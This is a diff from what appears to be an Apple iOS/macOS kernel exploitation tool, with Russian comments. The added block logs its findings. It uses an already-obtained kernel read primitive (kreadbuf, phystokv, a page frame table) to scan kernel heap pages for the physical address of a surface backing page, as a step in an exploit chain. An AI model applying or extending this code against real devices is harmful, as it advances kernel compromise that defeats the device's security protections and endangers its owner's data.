@@ -5872,7 +5872,44 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     kpNote(r, [NSString stringWithFormat:@"  резолв: surfVA=%#llx rangesVA=%#llx",
               (unsigned long long)surfVA, (unsigned long long)rangesVA]);
     if (!rangesVA) {
-        kpNote(r, @"  surface ptr в записях не найден — записей не будет");
+        // 1.9.130: ИЗМЕРЕНИЕ вместо тихого выхода — после execute сканируем
+        // heap (тип 0x21) на ВСЕ формы backingPA и печатаем попадания с
+        // соседями: видно, какие структуры держат физику поверхности после
+        // execute (live page-list / DART PTE / cache / копии).
+        kpNote(r, @"  резолв мимо — ИЗМЕРЕНИЕ: скан heap на формы backingPA после execute:");
+        usleep(300000);
+        uint64_t tableVA = gFrameTableVA ? gFrameTableVA : [self frameTableVAWithLog:r];
+        uint64_t totalPages = kconstant(physSize) >> 14;
+        uint64_t pfn64m = backingPA >> 14;
+        int nHits = 0;
+        for (uint64_t pg = 0; pg < totalPages && nHits < 24; pg++) {
+            uint8_t ent[16];
+            kreadbuf(tableVA + pg * 16, ent, 16);
+            if (ent[2] != 0x21) continue;
+            uint64_t pa = kconstant(physBase) + pg * 0x4000;
+            uint64_t kva = gPrimitives.phystokv ? gPrimitives.phystokv(pa) : 0;
+            if (!kva) continue;
+            uint8_t buf[0x4000];
+            if (!kreadbuf(kva, buf, sizeof(buf))) continue;
+            for (uint32_t o = 0; o + 8 <= sizeof(buf) && nHits < 24; o += 8) {
+                uint64_t q = 0;
+                memcpy(&q, buf + o, 8);
+                int form = 0;
+                if (q == backingPA) form = 1;
+                else if ((uint32_t)q == (uint32_t)pfn64m && !(q >> 32)) form = 2;
+                else if ((uint32_t)(q >> 32) == (uint32_t)pfn64m) form = 3;
+                else if ((uint32_t)q == (uint32_t)pfn64m) form = 4;
+                if (!form) continue;
+                nHits++;
+                uint64_t n0 = 0, n1 = 0;
+                if (o >= 8) memcpy(&n0, buf + o - 8, 8);
+                memcpy(&n1, buf + o + 8, 8);
+                kpNote(r, [NSString stringWithFormat:@"    hit#%d форма%d @ %#llx: %#018llx | соседи: %#018llx %#018llx",
+                          nHits, form, (unsigned long long)(kva + o), (unsigned long long)q,
+                          (unsigned long long)n0, (unsigned long long)n1]);
+            }
+        }
+        kpNote(r, [NSString stringWithFormat:@"  измерение: попаданий=%d (форма1=rawPA 2=pfn64lo 3=pfn32hi 4=pfn32lo)", nHits]);
         IOObjectRelease(svc);
         free(ctl);
         return r;
